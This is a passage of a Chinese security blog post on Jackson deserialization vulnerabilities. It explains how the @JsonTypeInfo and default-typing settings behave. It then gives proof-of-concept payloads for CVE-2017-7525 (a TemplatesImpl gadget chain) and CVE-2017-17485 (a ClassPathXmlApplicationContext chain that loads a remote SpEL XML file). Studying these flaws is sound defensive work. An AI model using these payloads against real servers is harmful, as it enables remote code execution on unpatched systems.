name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-2-2-JsonTypeInfo-Id-CLASS"><a href="#3-2-2-JsonTypeInfo-Id-CLASS" class="headerlink" title="3.2.2 JsonTypeInfo.Id.CLASS"></a>3.2.2 JsonTypeInfo.Id.CLASS</h4><p>JsonTypeInfo.Id.CLASS注解，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;@class&quot;:&quot;jackson.Boy&quot;,&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@3bfdc050</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将关联的类也给序列化了</p>
+<h4 id="3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS"></a>3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;@c&quot;:&quot;jackson.Boy&quot;,&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@5e3a8624</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看见@class变成了@c，缩短了相关类名</p>
+<h4 id="3-2-4-JsonTypeInfo-Id-NAME"><a href="#3-2-4-JsonTypeInfo-Id-NAME" class="headerlink" title="3.2.4 JsonTypeInfo.Id.NAME"></a>3.2.4 JsonTypeInfo.Id.NAME</h4><p>序列化为</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;age&quot;</span>:<span class="number">20</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="attr">&quot;object&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Boy&quot;</span>,<span class="attr">&quot;length&quot;</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。</p>
+<h4 id="3-2-5-JsonTypeInfo-Id-CUSTOM"><a href="#3-2-5-JsonTypeInfo-Id-CUSTOM" class="headerlink" title="3.2.5 JsonTypeInfo.Id.CUSTOM"></a>3.2.5 JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p>
+<h3 id="3-3-反序列总结"><a href="#3-3-反序列总结" class="headerlink" title="3.3 反序列总结"></a>3.3 反序列总结</h3><p>所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞</p>
+<p>1、enableDefaultTyping()</p>
+<p>2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</p>
+<p>3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><h3 id="4-1-CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#4-1-CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="4.1 CVE-2017-7525（基于TemplatesImpl利用链）"></a>4.1 CVE-2017-7525（基于TemplatesImpl利用链）</h3><h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p>
+<p>Jackson 2.7系列 &lt; 2.7.9.1</p>
+<p>Jackson 2.8系列 &lt; 2.8.8.1</p>
+<p>JDK版本</p>
+<p>POC </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;object&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;transletBytecodes&quot;</span>:[<span class="string">&quot;xxx&quot;</span>],</span><br><span class="line">            <span class="attr">&quot;transletName&quot;</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;outputProperties&quot;</span>:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里解释下设置的几个JSON键值对：</p>
+<ul>
+<li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列；</li>
+<li>transletName——TemplatesImpl类对象的_name属性值；</li>
+<li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li>
+</ul>
+<h3 id="4-2-CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"><a href="#4-2-CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）" class="headerlink" title="4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"></a>4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h3><p>Jackson 2.7系列 &lt; 2.7.9.2</p>
+<p>Jackson 2.8系列 &lt; 2.8.11</p>
+<p>Jackson 2.9系列 &lt; 2.9.4</p>
+<p>不受JDK限制，可直接在JDK1.8上运行。</p>
+<p>利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p>
+<p>POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8000/spel.xml\&quot;]&quot;</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/">https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/</a></li>
+<li></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Commons-Collections-1/" rel="prev" title="Commons-Collections-1">
+      <i class="fa fa-chevron-left"></i> Commons-Collections-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Java-Agent/" rel="next" title="Java-Agent">
+      Java-Agent <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%89%8D%E8%A8%80"><span class="nav-text">1. 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Jackson%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">2. Jackson的序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Jackson%E5%A4%9A%E6%80%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">3. Jackson多态类型的反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-DefaultTyping"><span class="nav-text">3.1 DefaultTyping</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-JAVA-LANG-OBJECT"><span class="nav-text">3.1.1  JAVA_LANG_OBJECT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-OBJECT-AND-NON-CONCRETE"><span class="nav-text">3.2.2 OBJECT_AND_NON_CONCRETE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-3-NON-CONCRETE-AND-ARRAYS"><span class="nav-text">3.2.3 NON_CONCRETE_AND_ARRAYS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-4-NON-FINAL"><span class="nav-text">3.2.4 NON_FINAL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-5-%E6%80%BB%E7%BB%93"><span class="nav-text">3.2.5 总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-JsonTypeInfo%E6%B3%A8%E8%A7%A3"><span class="nav-text">3.2 @JsonTypeInfo注解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-1-JsonTypeInfo-Id-NONE"><span class="nav-text">3.2.1 JsonTypeInfo.Id.NONE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-JsonTypeInfo-Id-CLASS"><span class="nav-text">3.2.2 JsonTypeInfo.Id.CLASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS"><span class="nav-text">3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-4-JsonTypeInfo-Id-NAME"><span class="nav-text">3.2.4 JsonTypeInfo.Id.NAME</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-5-JsonTypeInfo-Id-CUSTOM"><span class="nav-text">3.2.5 JsonTypeInfo.Id.CUSTOM</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%80%BB%E7%BB%93"><span class="nav-text">3.3 反序列总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">4. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89"><span class="nav-text">4.1 CVE-2017-7525（基于TemplatesImpl利用链）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%99%90%E5%88%B6"><span class="nav-text">环境限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-CVE-2017-17485%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89"><span class="nav-text">4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
